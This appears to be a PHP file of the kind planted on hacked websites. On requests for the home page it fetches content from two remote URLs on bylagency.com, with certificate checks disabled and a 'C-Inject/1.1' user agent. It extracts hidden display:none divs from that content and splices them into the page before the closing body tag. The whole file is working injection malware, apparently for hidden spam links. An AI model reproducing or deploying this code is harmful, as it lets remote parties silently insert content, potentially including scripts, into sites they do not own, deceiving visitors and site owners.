<?php
$u=parse_url($_SERVER['REQUEST_URI'] ?? '/');$p=$u['path'] ?? '/';
if(!in_array($p, ['/', '/index.php', '/index.html'])) return;

$s=[
    'https://bylagency.com/suntik2/suntik2.txt',
    'https://bylagency.com/suntik3/suntik3.txt'
];

function g($z){
    if(function_exists('curl_init')){
        $c=curl_init();
        curl_setopt_array($c,[CURLOPT_URL=>$z,CURLOPT_RETURNTRANSFER=>1,CURLOPT_CONNECTTIMEOUT=>5,CURLOPT_TIMEOUT=>8,CURLOPT_USERAGENT=>'C-Inject/1.1']);
        @curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);
        @curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);
        @curl_setopt($c,CURLOPT_SSL_VERIFYHOST,0);
        $r=curl_exec($c);
        $h=curl_getinfo($c,CURLINFO_HTTP_CODE);
        curl_close($c);
        if(is_string($r)&&$h>=200&&$h<300)return $r;
    }
    if($r==''&&ini_get('allow_url_fopen')){
        $ctx=stream_context_create(['http'=>['timeout'=>8,'header'=>"User-Agent: C-Inject/1.1\r\n"],'ssl'=>['verify_peer'=>0,'verify_peer_name'=>0]]);
        $r=@file_get_contents($z,0,$ctx);
        if($r!==false)return $r;
    }
    return '';
}

function x($h){
    if(preg_match('/<div[^>]*style\s*=\s*["\'][^"\']*display\s*:\s*none[^"\']*["\'][^>]*>.*?<\/div>/is',$h,$m))return $m[0];
    if(preg_match('/<div[^>]*display\s*:\s*none[^>]*>.*?<\/div>/is',$h,$m))return $m[0];
    return '';
}

function i($b){
    if(stripos($b,'<html')===false&&stripos($b,'<!doctype')===false&&stripos($b,'</body>')===false)return $b;
    global $s;
    $c=[];
    foreach($s as $z){
        $r=g($z);
        if($r==='')continue;
        $r=trim($r);
        $d=x($r);
        if($d==='')$d=$r;
        $c[]=$d;
    }
    if(empty($c))return $b;
    $h=implode("\n",$c);
    $pos=stripos($b,'</body>');
    if($pos!==false)return substr($b,0,$pos)."\n".$h."\n".substr($b,$pos);
    return $b."\n".$h;
}

if(!headers_sent())ob_start('i');
register_shutdown_function(function(){if(ob_get_level()>0)@ob_end_flush();});
?>
